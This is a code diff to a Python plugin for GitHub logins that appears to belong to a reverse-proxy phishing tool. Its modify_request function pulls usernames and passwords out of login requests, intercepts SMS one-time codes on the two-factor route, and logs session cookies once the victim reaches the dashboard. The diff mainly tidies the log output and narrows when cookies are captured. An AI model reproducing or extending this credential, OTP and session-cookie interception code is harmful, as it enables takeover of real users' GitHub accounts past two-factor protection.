@@ -13,10 +13,10 @@ def modify_request(
     global actual_host
 
     # Get route
-    log: str = "\n"  # Log
-    log += (
-        "[plugins/github.com:modify_request] Request for %s\n"
-        % (request_parameters["route"])
+    log: str = ""  # Log
+    log += "[plugins/github.com:modify_request] %s request for %s\n" % (
+        request_parameters["method"],
+        request_parameters["route"],
     )  # Log
 
     # Get username and password
@@ -29,30 +29,30 @@ def modify_request(
 
         password = request_body.split(b"&password=")[1].split(b"&")[0].decode()
         password = urllib.parse.unquote(password)
-        log += (
-            "\n[plugins/github.com:modify_request] Found credentials -> %s:%s\n\n"
-            % (
-                username,
-                password,
-            )
+        log += "[plugins/github.com:modify_request] Found credentials -> %s:%s\n" % (
+            username,
+            password,
         )
 
     # Get SMS OTP code
     if request_parameters["route"] == "/sessions/two-factor":
         sms_otp = request_body.split(b"&")[1].split(b"=")[1]
-        log += "\n[plugins/github.com:modify_request] SMS OTP Intercepted -> %s\n\n" % (
+        log += "[plugins/github.com:modify_request] SMS OTP Intercepted -> %s\n" % (
             sms_otp.decode()
         )  # Log
 
-    # Get logged in cookie value
-    if "cookie" in request_headers:
+    # Get cookie values if requesting dashboard (means the user logged in succesfully)
+    if "cookie" in request_headers and (
+        request_parameters["route"] == "/dashboard"
+        or request_parameters["route"] == "/"
+    ):
         cookies = request_headers["cookie"][0]
         for cookie in cookies.split(";"):
             _cookie_name = cookie.split("=")[0]
             log += "[plugins/github.com:modify_request] Intercepted cookie -> %s\n" % (
                 cookie
             )  # Log
-    print(log)  # Log
+    print(log.strip())  # Log
 
     # Modify host
     actual_host = request_headers["host"][0]
